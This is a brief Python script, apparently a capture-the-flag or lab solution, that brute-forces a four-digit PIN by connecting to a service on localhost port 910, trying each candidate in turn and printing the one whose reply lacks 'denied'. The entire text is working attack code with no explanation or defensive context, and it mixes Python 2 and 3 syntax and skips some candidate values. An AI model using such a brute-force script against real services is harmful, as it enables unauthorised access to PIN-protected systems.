#!/usr/bin/python
import socket, sys, os, time
def brute(password):
	try:
		s = socket.create_connection(("localhost", 910))
	except:
		print("Can't connect.")
		sys.exit(0)
	s.recv(1024)
	s.send("{}\n".format(password))
	if not "denied" in s.recv(1024):
		print "Pin: {}".format(password)
		sys.exit(0)
	s.close()
for i in range(1,9999):
    i = str(i)
    brute(i.zfill(4))
